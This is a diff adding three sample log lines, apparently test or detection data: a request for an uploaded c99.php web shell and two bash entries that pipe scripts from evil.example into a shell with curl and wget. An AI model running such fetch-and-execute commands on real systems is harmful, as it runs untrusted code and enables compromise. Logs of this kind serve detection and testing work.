@@ -1,0 +1,3 @@
+192.168.1.10 - - [22/Oct/2026:12:00:01 +0000] "GET /uploads/c99.php HTTP/1.1" 200 512
+Oct 22 12:00:02 web01 bash: curl http://evil.example/payload.sh | bash
+Oct 22 12:00:03 web01 bash: wget -qO- http://evil.example/x | sh
